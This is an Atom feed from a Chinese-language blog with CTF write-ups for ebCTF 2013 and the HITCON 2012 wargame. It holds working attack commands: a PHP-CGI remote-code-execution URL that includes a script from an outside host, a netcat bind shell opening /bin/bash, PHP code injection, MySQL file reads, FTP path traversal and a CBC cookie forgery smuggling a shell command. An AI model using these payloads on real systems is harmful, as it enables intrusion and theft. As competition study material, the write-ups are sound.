<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: wargame | blog.dm4.tw]]></title>
  <link href="http://blog.dm4.tw/blog/categories/wargame/atom.xml" rel="self"/>
  <link href="http://blog.dm4.tw/"/>
  <updated>2013-11-09T01:40:42+08:00</updated>
  <id>http://blog.dm4.tw/</id>
  <author>
    <name><![CDATA[dm4]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ebCTF 2013 Writeup]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/"/>
    <updated>2013-11-08T20:56:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup</id>
    <content type="html"><![CDATA[<p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>

<h2>BIN100</h2>

<p>擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。</p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN300</h2>

<p><code>
$ gdb
(gdb) file moon
(gdb) b luaL_loadbuffer
Breakpoint 1 at 0x411110
(gdb) r
Breakpoint 1, 0x0000000000411110 in luaL_loadbuffer ()
(gdb) x/3s $rsi
0x627340 &lt;content.2593&gt;:    "p = 54111037\ng = 56321\n\nio.write(\"Enter your password: \")\nio.flush()\npassword=io.read()\nif string.len(password) ~= 32 then\n    print(\"Wrong!\")\n    return 0\nend\n\nv = g\nalpha = \"0123456789abcdef\"\nfor lo"...
0x627408 &lt;content.2593+200&gt;:    "op =1,32 do\n    v = v * g\n    v = v % p\n    r = v % 16\n    good = string.sub(alpha,r+1,r+1)\n    if good ~= string.sub(password,loop,loop) then\n        print(\"Wrong!\")\n        return 0\n    end\nend\nprin"...
0x6274d0 &lt;content.2593+400&gt;:    "t(\"Well done, the flag is: ebCTF{\"..password..\"}\")\n-- f02233aca4839124ee6ffa766883c47e\n"
</code></p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN400</h2>

<p>題目是要生出 5 個 MD5 一樣的 console executable PE32 ，分別會印出：</p>

<ul>
<li>File1: All Eindbazen are wearing wooden shoes</li>
<li>File2: All Eindbazen live in a windmill</li>
<li>File3: All Eindbazen grow their own tulips</li>
<li>File4: All Eindbazen smoke weed all day</li>
<li>File5: All Eindbazen are cheap bastards</li>
</ul>


<p>所以做 md5 collision ，原本檔案的內容是對自己做簡單的 hash 再從 hash 決定要印哪一句：</p>

<p>```
// by seanwu</p>

<h2>include &lt;stdio.h></h2>

<p>const char* str[5]= {</p>

<pre><code>"All Eindbazen are wearing wooden shoes",
"All Eindbazen live in a windmill",
"All Eindbazen grow their own tulips",
"All Eindbazen smoke weed all day",
"All Eindbazen are cheap bastards"
</code></pre>

<p>};
int main(int argc,char **argv){</p>

<pre><code>FILE* f=fopen(argv[0],"rb");
fseek(f,-20005,SEEK_END);
int x=0;
unsigned char z;
for( int i=0; i&lt;20000; i++ ){
    fread(&amp;z,1,1,f);
    x=(x*33331+z)%5;
}
x=(x+5)%5;
puts(str[x]);
return 0;
</code></pre>

<p>}
```</p>

<h3>Reference</h3>

<ul>
<li><a href="http://www.mscs.dal.ca/~selinger/md5collision/">http://www.mscs.dal.ca/~selinger/md5collision/</a></li>
<li><a href="http://www.woodmann.com/forum/archive/index.php/t-10096.html">http://www.woodmann.com/forum/archive/index.php/t-10096.html</a></li>
</ul>


<h2>CRY100</h2>

<ul>
<li><p>1st PART</p>

<p>  原文在 <a href="http://en.wikipedia.org/wiki/Klomp">http://en.wikipedia.org/wiki/Klomp</a> ，用原文來解對應。</p></li>
<li><p>2nd PART</p>

<p>  用的是 ADFGVX cypher 用的 key 是 &lsquo;CARGO&rsquo; ，可以到 <a href="http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en">http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en</a> 做完之後再找一下對應：</p></li>
</ul>


<p>```
$ echo &lsquo;KZUJJUN06TR3T2T6ABTEAB163A3NREE1JZ6N3QFLIYHMP X7V6C6TUK53TZ653N2UNRB316WE11VZ3UV3AKKZUJJ3RV 6D6SZ6J32S11D353TDVZUN0UK68U2N6V23312T33V646N VE4VA36NJZ6N3NSAB3TQFLIYHMPX78UNRT30ETRKBTEAF QQ8U16J6VEV63KHQ8U164ES1U216W3TLL8U16EJJ13KFI Y8U1613386N3K346NRJETV62VZ321E0B4F4Q7&rsquo; | tr -d &lsquo; &rsquo; | tr KZUJN06TR32ABEQFLIYHMPX7VC54 shipngordefmba0123456789tjvc</p>

<p>shippingorderfrombramb1oemendaa1phone0123456789tojorisverhovenfindbe1oWa11theitemsshippedtoDoShopefS11DeverDthingiso8ifnotfee1freetocontactmeonphonenSmber01234567898indregardsbram1008i1opotatoes508i1ocaS1if1oWer228i1oapp1es1348i1o1ee8onesecondpartofthef1agbc1c09
```</p>

<ul>
<li><p>3rd PART</p>

<p>  <code>base64</code> 之後猜測可能是被 <code>xor</code> 過後的 <code>jpeg</code> ，找出 <code>xor</code> key 之後 flag 在圖片裡。</p></li>
<li><p>4th PART</p>

<p>  切開之後直的看就是了！</p></li>
</ul>


<p>```
$ echo &lsquo;thhneu hpeitr eafnw frleo otata uoghb rfirf ttseo&rsquo; | tr &lsquo; &rsquo; $&lsquo;\n&rsquo;</p>

<p>thhneu
hpeitr
eafnw
frleo
otata
uoghb
rfirf
ttseo
```</p>

<ul>
<li><p>5th PART</p>

<p>  人眼找對應：</p></li>
</ul>


<p>```
$ cat 5.txt | tr &ldquo;[:lower:]&rdquo; &ldquo;[:upper:]&rdquo; | tr SIWZGDRYUOMKQBTJPNFEHLX aistheflgbuprodywmcknxv</p>

<p>a common mistake made by foreigners is that the netherlands legaliAed the use of cannabis and other recreational soft drugs. according the law any use of drugs is still illegal, but there is a tolerancy policy called gedoogbeleid for any soft drugs. this is a set of guidelines telling public prosecutors under which circumstances offenders should not be prosecuted. according to current gedoogbeleid the possession of a maximum amount of five grams cannabis for personal use is not prosecuted. cultivation is treated in a similar way. cultivation of 5 plants or less is usually not prosecuted when they are renounced by the cultivator.  so if you come to the netherlands and want to try some recreational use of soft drugs, beware that it is not legal. the fifth part for the flag is ab1fde
```</p>

<ul>
<li><p>6th PART</p>

<p>  Caesar cipher with shift = 4</p></li>
</ul>


<p>```
$ cat 6.txt | tr &ldquo;[:upper:]&rdquo; &ldquo;[:lower:]&rdquo; | tr abcdefghijklmnopqrstuvwxyz wxyzabcdefghijklmnopqrstuv</p>

<p>the delta works is a series of construction projects in the southwest of the netherlands to protect a large area of land around the rhine-meuse-scheldt delta from the sea. the works consist of dams, sluices, locks, dikes, levees, and storm surge barriers. the aim of the dams, sluices, and storm surge barriers was to shorten the dutch coastline, thus reducing the number of dikes that had to be raised.
along with the zuiderzee works, delta works have been declared one of the seven wonders of the modern world by the american society of civil engineers. the last part of the flag is: one-five-f-three-four-}
```</p>

<h2>CRY200</h2>

<p>聽大大說是要去對一堆 n 去做 gcd ，分解出其中一組質數 p, g ，接著再去暴力試出 e, d</p>

<h3>Reference</h3>

<ul>
<li><a href="http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/">http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/</a></li>
</ul>


<h2>CRY300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://pastebin.com/vsUZW2WF">http://pastebin.com/vsUZW2WF</a></li>
</ul>


<h2>CRY400</h2>

<h2>FOR100</h2>

<p>先 <code>strings</code> 發現</p>

<pre><code>eindbazen@eindbazen:~$ python2 ctf.py ' i hide my '
</code></pre>

<p>感覺就是他了！所以試著 <code>grep ctf.py</code> 沒東西之後，再試了 <code>grep sys.argv</code> 會找到一段 <code>python</code> code</p>

<p>```
import sys
import time
import random
import signal
from Crypto.Cipher import AES
key1 = &ldquo;is this where&rdquo;
key2 = sys.argv[1]
key3 = raw_input(&ldquo;Password: &rdquo;)
iv = &lsquo;a very random iv&rsquo;
secret = &lsquo;./flag&rsquo;
mode = AES.MODE_CBC
def encrypt(signum, frame):</p>

<pre><code>key = key1 + key2 + key3
enc = AES.new(key, mode, iv)
inp = raw_input("Enter secret: ")
diff = len(inp) % 16
if diff != 0:
inp += ' ' * (16 - diff)
with open(secret, 'wb') as outfile:
    outfile.write(enc.encrypt(inp))
del key, enc
</code></pre>

<p>def decrypt(signum, frame):</p>

<pre><code>key = key1 + key2 + key3
enc = AES.new(key, mode, iv)
with open(secret, 'rb') as infile:
    print(enc.decrypt(infile.read(48)))
del key, enc
</code></pre>

<p>signal.signal(signal.SIGUSR1, encrypt)
signal.signal(signal.SIGUSR2, decrypt)
while True:</p>

<pre><code>time.sleep(1)
</code></pre>

<p>```</p>

<p>接著要找 <code>key3</code> ，試著 <code>grep 'i hide my'</code> 之後找到一行</p>

<pre><code>is this where i hide my secrets?
</code></pre>

<p>拿他當 key 跑 AES decrypt 就拿到 flag 了！</p>

<h2>FOR200</h2>

<h3>Reference</h3>

<pre><code>&lt; Guest10733&gt; how did u get sms in for200 ?
&lt;@gijs&gt; Guest10733: the SMS is stored in inbox.txt but in some binary format that is also used to transmit sms over the network
&lt; cr0n&gt; Guest10733: sms pdu: http://www.smartposition.nl/resources/sms_pdu.html
</code></pre>

<h2>FOR300</h2>

<h3>Reference</h3>

<h2>FOR400</h2>

<h2>NET100</h2>

<p>從給的 <code>net-100.pcap</code> 裡可以找到一個有密碼的 <code>rookit.zip</code> ，發現裡面有 flag ，接著就是要找解壓縮密碼了，密碼可以在一連串的 udp packet 中找到！</p>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET200</h2>

<p>這題一開始只給了 <code>112 + 386 + 712 + 1398 + 8771 + 11982 + 15397 + 23984 = 51037</code> ，連到網頁看到了 <code>X-Powered-By:*knock knock*</code> ，猜測是要做 port knocking ！</p>

<p><code>
$ nc -w 1 54.216.81.14 112;
$ nc -w 1 54.216.81.14 386;
$ nc -w 1 54.216.81.14 712;
$ nc -w 1 54.216.81.14 1398;
$ nc -w 1 54.216.81.14 8771;
$ nc -w 1 54.216.81.14 11982;
$ nc -w 1 54.216.81.14 15397;
$ nc -w 1 54.216.81.14 23984;
$ nc -w 1 54.216.81.14 51037;
So you are knocking me, how about I return the favor?
Repeat after me and I will open the last port…
</code></p>

<p>下一階段的提示是要照著對方敲我們 port 的順序敲回去，我們是利用 <code>iptables</code> 來把進來的 tcp connection 記錄下來：</p>

<p>```</p>

<h1>iptables -A INPUT -p tcp -j LOG &mdash;log-prefix &lsquo; INPUT TCP &rsquo; &mdash;log-level 4</h1>

<p>```</p>

<p>接著會在 <code>/var/log/kern.log</code> 拿到記錄，接著再敲回去：</p>

<p>```
$ nc -w 1 54.216.81.14 8112;
$ nc -w 1 54.216.81.14 33386;
$ nc -w 1 54.216.81.14 14712;
$ nc -w 1 54.216.81.14 4398;
$ nc -w 1 54.216.81.14 1771;
$ nc -w 1 54.216.81.14 52313;
$ nc -w 1 54.216.81.14 25697;
$ nc -w 1 54.216.81.14 932;
$ nc -w 1 54.216.81.14 22222;
[Advanced]</p>

<pre><code>    sequence    = 234,781,983,2411,9781,14954,23112,63991
    seq_timeout = 15
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
    tcpflags    = fin,urg,!ack
    cmd_timeout = 30
    stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
</code></pre>

<p>```</p>

<p>拿到第三階段的提示了！查了一下發現是 <a href="http://www.zeroflux.org/projects/knock/">knockd</a> 的設定檔，這次會檢查 tcp flags ，我們是用 (hping)[<a href="http://www.hping.org/">http://www.hping.org/</a>] 來設 tcp flags</p>

<p><code>
hping3 -c 1 -F -U -p 234   54.216.81.14
hping3 -c 1 -F -U -p 781   54.216.81.14
hping3 -c 1 -F -U -p 983   54.216.81.14
hping3 -c 1 -F -U -p 2411  54.216.81.14
hping3 -c 1 -F -U -p 9781  54.216.81.14
hping3 -c 1 -F -U -p 14954 54.216.81.14
hping3 -c 1 -F -U -p 23112 54.216.81.14
hping3 -c 1 -F -U -p 63991 54.216.81.14
</code></p>

<p>最後再連 port 32154 就會噴 flag 了！</p>

<h3>Reference</h3>

<pre><code>&lt; ai1&gt; Ghaaf, the final one:

    nmap -vvv -PN --scanflags FINURG 54.216.81.14 -r -p234,781,983,2411,9781,14954,23112,63991 --scan-delay 1

&lt; Tilou&gt; http://pastebin.com/jBr3d9wR &lt;- hping way

    #!/bin/bash
    sequence="234 781 983 2411 9781 14954 23112 63991"
    for port in $sequence; do
        hping -F -U -c 1 -p $port 54.216.81.14 &gt; /dev/null 2&gt;&amp;1
    done
    nc 54.216.81.14 32154
</code></pre>

<ul>
<li><a href="http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up">http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up</a></li>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET400</h2>

<h3>Reference</h3>

<h2>PWN100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; foundation: pwn100 initial key https://p.6core.net/p/yMz8naU2ZphAAHWjGkY7ICcD

-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEA8Ew1BzA3rNBwrFYevJ6mJMVfe+ZMrbrq20Q78MIprjxMmEV8
hUiYq4CftCeNj+XxYYuaYLwAA8GfW+wrS04AAEzHTNwc1wKbHdOzvParhiIFOjJ2
NX/ljlQA7LCO0bToMg971gKrFGYPGMa5vKsx9hXyDCLegXHV3G/duPxaG0hkYucC
UrilqtGMFmpFQu+vgDdudEEVg+01BtNanCxOeYuWLnd8ViZx3qrdooPNnhxh1hop
ciYNp5ORQiYKFFCmIxAMRnXYlZt5CbPIbNrRLHKSnrDyOhSLa0e3tjnGYv+YjrHB
OaWQoPu3dOu88ason5jhbTKzZ2gOe24vlg9hdwIBIwKCAQApMaKwxm/xvVUk25A9
l4oyMHbEyGTqlRJReWlceQ51o+/fluIleijM8Xp2p7HeJ2s1SyHHcK+LnYkIcaEF
mFfFiYFAYD91UOdkMuucvJJuxADlZ7x+My6qr1Cdmpwj8yB9nEEdX4sKz6rRDB/X
M0pks04QtYU6ww64Ey1S6W6IVTh/6TNzPc2mEBtHJd7yDI08aY0fbIOf5z4WNPBE
oEYIu6FWTMDf57XaUPclrPNnCturWcAdzw1DgYiyuDaS4YtryDfyaBA+WbepEOEb
HFkMf6jgDfqpnGc+vL8Z3ggoftOHZPdS3NNScrR1zRZbRyLP6DNRPjmIldThIrdv
fb+LAoGBAPzFhrlH84GwoZs+Hd/YFYgQxySGEqSspp6x14wv+7eseUN8Vp/+A11Z
kZfRHrZU5r5eTIlo+ajXeX8Uu04U5A0X3mFXpfsGksPuEvVPPzCHwHIvfsDl2u/3
ymStMDg2DHbAnyncLYUVVMjAVudL7MDq3fz1T44gfAcj+/jQOgwBAoGBAPNd5UeV
MfRcJ1G5RNDm5kTkXegMNXEH1wF+HFTb3v5Ey9A6tnc+Bhpg66QgSYtwIPdll2oF
9Jdw+8oa4tL785ZrzGSTcNQjUrBsE7H/dkPbyXH+4KXMKUEwME2cz7PrZKU4RZ9P
b+WACdIFaH3mn3H38GPIotWqLK2LfQi7d813AoGAVqofj/tpbkswF/gKPh4zRJgJ
w2Eq9qGYNmjcMBBzj25VdjlCRXupYdWRANn75r4F+CBUwWXR8L7n08yX/YOBY5Mn
rFiQrdZeNIwjwdIHCVMdaPpXWBRLEHI2w26UMIePPqhxFaqTQ5JI9F8zvQQWqIsK
SBmXnnGJnAxWY++e34sCgYB2NOu1DfOxNBMZENhINaMLhN0nkObB3zyLskhGeWxP
ncIUrs2nochzNmPTYCO4wW8ZFBZYEYVuIO9TiWbbgbDUCHk4KltfuWKtdlK1irXJ
MD1F/3RtyZBhfc5RlU7w/U4kXSkhflrr0HnMaQbeEO5b7XTCwIma+uKALc8EPcx5
vQKBgBCqEbKrfUF5H1QQunHiIsRE40zJ8MaGZbdT7ZC/bXTcwFnC+m3Ql/Iko3KU
qJ59EAryB5SmrpViNlhl3JL+Pu2m4fNhvxVfBdNSxuJMjodK6n2O4WeF0NUS0bpZ
EZRema+mBXD/lSTh1d9FnEOwrbFFEnuTZfAnEvEFo1m/Qn43
-----END RSA PRIVATE KEY-----
</code></pre>

<h2>PWN200</h2>

<pre><code>$ perl -e 'print "&gt;"x51 . "-"x47 . "\ncat IM_A_FLAG\n"' | nc 176.34.95.148 31313
</code></pre>

<h2>PWN300</h2>

<h3>Reference</h3>

<pre><code>&lt; gna_&gt; pwn300 writeup
&lt; gna_&gt; http://pastebin.com/G0KvW6t6
&lt; bata_&gt; pwn300 http://pastebin.com/gc8u6J3M
</code></pre>

<ul>
<li><a href="http://haxx.in/ebctf_pwn300_sploit.php.txt">http://haxx.in/ebctf_pwn300_sploit.php.txt</a></li>
<li><a href="http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html">http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html</a></li>
</ul>


<h2>PWN400</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html">http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html</a></li>
</ul>


<h2>WEB100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; loveldyream: this is what i developed when i tested it
        https://p.6core.net/p/0lAkDRAsvPqj1zeMVz6A5xcl&gt; using blind
        injection but i know the author has a one-liner which will
        return the value directly without using blind injection
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/46">http://hardc0de.ctf.su/archives/46</a></li>
</ul>


<h2>WEB200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/11">http://hardc0de.ctf.su/archives/11</a></li>
</ul>


<h2>WEB300</h2>

<h3>Reference</h3>

<pre><code>&lt; daniel1024&gt; xpath injection in web100?
&lt; daniel1024&gt; *300
&lt;@gijs&gt; daniel1024: yes xpath injection
&lt; RlIxOTA4&gt; web300 was xpat
&lt; RlIxOTA4&gt; h
</code></pre>

<h2>WEB400</h2>

<p>這題很有趣！雖然我們沒有解出來 XD</p>

<p>一開始要利用 <code>function hmac($data)</code> 裡的 typo 讓我們可以假造合法的 cookie ，
接著再利用 AES CBC mode 解密時會和前一個 block 做 xor 的特性，
只要知道某一段 plaintext 是什麼，就可以在 ciphertext 中 xor 前一個 block ，
讓解出來的 plaintext 變成我們想要的（超抽象 XD ）</p>

<p>沒有寫完整 writeup ，有興趣的人可以看下面的 reference 研究一下 PoC ！</p>

<h3>Reference</h3>

<pre><code>&lt; phiber_&gt; web400 solution http://privatepaste.com/1d0f3254f6

&lt;?php
$a = base64_decode(urldecode('%2FW8w%2BUpwN%2B2vh85b54XcyGM2wSNNFFcBqoGr%2BX5S7FOuJn%2FJBJwp1R1F5VpqsR9NkW82Ut8L5hPFKa%2BWIEs2W9DP9Qnq9zhmAJ5FwbNcY6viYT2kZd1Yz06lplcsnRuaFU8gj5TV9jHX8wps2%2BTaAO68TrHgF3Scvt56BrGAlZX%2Fp24qGKQf5m%2B15RdsgC6M%2BQ9Fl7KhwazU1F9yJ9rx7GH5HsCC4ztYeVVoiFYQQIDMPMHZkIeA7sbYrhH6L9Ej8DlEb2dErkHBVP98Wp5aAxm8jIXeqgBHfPF8s26o%2Bjs2T6XfWm3cv%2FN4yp93yGEpSja7dAr1Bdw3k1TVVPAqzGFBA2SbB6skHQhNiC5hfJ4TdymBfzzt8QLvGT3KKBlQP1sgNcLIpwhFCOGlGkN1Nq7%2Bb2GV5h%2FtyLH%2FTW2LGuVcBCTRXFY7mC0IPV2WCFSTyOddnX5t2sNeU9zBop9WeWQe199f50%2FRKRX4aA%2FLsSrGqv%2F2s4z96n9I0Zu4oGcpb9hGh3zvzGZQy6J4TAeKRKCRsIW3vDFacngSGcUAklS4nsRqXJBVEZ70WcBFQjVI7zMX8cjJS8RiyQLKgGpKirYotsetFk98xonYzbwBnyNLiNFEM0WSsPoDSW2UvQe3NfDEJKwT63l9uaAHTbfWXQ%3D%3D'));
$blocks = str_split($a, 16);
$blocks[22] = $blocks[22] ^ str_repeat('a', 16) ^ "';cat *; echo 'a";
$b = implode('', $blocks);
echo urlencode(base64_encode($b))."\n";
?&gt;
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/43">http://hardc0de.ctf.su/archives/43</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes - Part 2]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2/"/>
    <updated>2012-07-26T14:21:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2</id>
    <content type="html"><![CDATA[<h3>Web 5</h3>

<p>結果回家研究了一下，終於把 Web 5 也解出來了！好後悔在 HITCON 花太多時間在看
<a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a> 啊啊啊 orz</p>

<p>這題的 <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/19527.pdf">提示二</a>
出來之後，可以發現長檔名的檔案/資料夾會因為 <code>~</code> 的縮寫而 disclosure ，所以可以寫個
<a href="https://gist.github.com/3180618">script</a> 來踹，或是用 hint 裡有提到的 <a href="http://code.google.com/p/iis-shortname-scanner-poc/">iis-shortname-scanner-poc</a></p>

<p>不過試了之後發現 file disclosure 只限於有 <code>~</code> 的長檔名，
如果只是 6, 7 個字的檔案/資料夾是不會被套用縮寫的規則，所以也就踹不出來，
在 HITCON 的時候我們就是卡在這裡。</p>

<p>回家再查了多一點資料的時候，看到更多有關 <a href="http://scilnet.fortlewis.edu/tech/NT-Server/File_Names.htm">8.3 Filename</a>
的介紹，其中提到：</p>

<blockquote><p>To disable short filename support, use the registration database editor, REGEDT32.EXE,
and search the HKEY_LOCAL_MACHINE section for the entry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem.
Change the value of the parameter NtfsDisable8dot3NameCreation to a value of 1 (one),
and then short filename generation will be disabled.</p></blockquote>

<p>所以就想到去試一下 <a href="http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt">http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt</a>
沒想到就&hellip;&hellip; orz</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/"/>
    <updated>2012-07-22T11:27:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes</id>
    <content type="html"><![CDATA[<p>今年是第二年來 HITCON ，去年感謝 atdog 大大帶我一起報名 HITCON 玩 wargame ，
本來想說和去年一樣解解 QR code 我就很開心了，沒想到今年運氣不錯 XD</p>

<p>感謝同隊 crax 的組員： atdog xman jeffxx cyen hliu kvchung</p>

<p>Wargame 題目有大大幫忙備分了：<a href="http://rsghost.org/backup/wargame.hitcon.org/">HITCON 2012 Wargame</a></p>

<h2>Wargame 心得</h2>

<p>這次因為運氣好，所以有幾題 web 都用爛招解掉了 XD
用和 hint 沒關係的解法繞掉其實解的有點心虛，下面是今年我有幫到一些忙的題目：</p>

<h3>Web 1</h3>

<p>主要就是利用 <code>{${fucntion()}}</code> 來直接執行 php function ，本來想用 <code>file_get_contents()</code> 來讀 <code>key.php</code> 發現被擋掉了，
所以就試著用 <code>include()</code> 再用 <code>get_defined_vars()</code> 和 <code>var_dump()</code> 看有沒有設什麼變數，還好 <code>key.php</code> 是把 key 放在變數裡，
不然的話就要用其他方法去看 source 了。</p>

<pre><code>http://wg.hack.idv.tw/~ow100/orange.php?name=dm4&amp;data={${include($_GET[key])}}{${var_dump(get_defined_vars())}}
http://wg.hack.idv.tw/~ow100/yourfiles/dm4.config.php?key=../key.php
</code></pre>

<h3>Web 2</h3>

<p>利用 Web 3 給的 <code>sqln00b/sqln00b</code> 可以登入 phpMyAdmin ，接著把 <code>key.php</code> LOAD 到任何一個 table 就可以了：</p>

<pre><code>CREATE TABLE web2 (src TEXT);
LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
</code></pre>

<h3>Web 4</h3>

<p>從 <code>info.php</code> 發現 <code>Server API: CGI</code> 想到應該是在說今年的 <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">PHP CGI vulnerability</a>
，這東西今年出來的時候有看一下，不過其實還是在解題的時候才真的看懂 XD</p>

<p>在 <code>htaccess.txt</code> 裡可以看到</p>

<pre><code>RewriteCond %{QUERY_STRING} \-|\-d[a-z_]+%3d|%2d[a-z_]+%3d [NC]
</code></pre>

<p>發現 <code>%2d</code> 擋的比較鬆，所以研究了一下可以用</p>

<pre><code>http://wg.hack.idv.tw/~w100/info.php?%2dd+allow_url_include%3dOn+%2dd+auto_prepend_file%3dhttp://myhost/a.txt
</code></pre>

<p>來做 remote code execution ，試了一下就可以發現要找的東西在 <code>../key.txt</code> ，所以在 <code>a.txt</code> 這樣寫就可以讓它噴 key 了：</p>

<pre><code>&lt;?php
    system('cat ../key.txt');
    exit();
?&gt;
</code></pre>

<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&hellip;&hellip;</p>

<pre><code>&lt;?php
    system('nc -l -p 5566 -e /bin/bash');
    exit();
?&gt;
</code></pre>

<p>然後&hellip;&hellip;</p>

<pre><code>[~] $ nc wg.hack.idv.tw 5566
id
uid=1002(w100) gid=33(www-data) groups=1002(w100),33(www-data)
</code></pre>

<h3>Web 3</h3>

<p>這題看 hint 應該是要用 mysql client 的 <code>system</code> 來解，不過我們利用 Web 4 拿到的 back connect shell
可以發現要找的東西是 <code>/home/my100/key.txt</code> ，所以一樣用：</p>

<pre><code>CREATE TABLE web3 (src TEXT);
LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
</code></pre>

<p>就可以在 Web 2 的 phpMyAdmin 看到 key 囉~</p>

<h3>Web 6</h3>

<p>也是用爛招&hellip;&hellip; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>

<h3>Potent Pwnables 2</h3>

<p><code>nmap</code> 完之後發現有開 ftp ，查了一下發現有 <a href="http://www.exploit-db.com/exploits/18182/">Serv-U FTP Jail Break</a>
和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>

<p>關鍵是 <code>Plz Input "Your" Real ID:</code> 要用 <code>wargame.hitcon.org</code> 的帳號去 generate key.txt 接下來就：</p>

<pre><code>[~] ➟  ftp jumpochisun.blogsyte.com
Connected to jumpochisun.blogsyte.com.
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (jumpochisun.blogsyte.com:dm4): hitcon2012
331 User name okay, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; get ..:/..:/..:/..:/key/dm4key.txt key.txt
local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
227 Entering Passive Mode (114,36,241,246,15,231)
150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (0.80 KiB/s)
</code></pre>

<p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
不過看到結束還是沒找到應該怎麼解&hellip;&hellip;</p>

<p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>

<p>爽啊！</p>

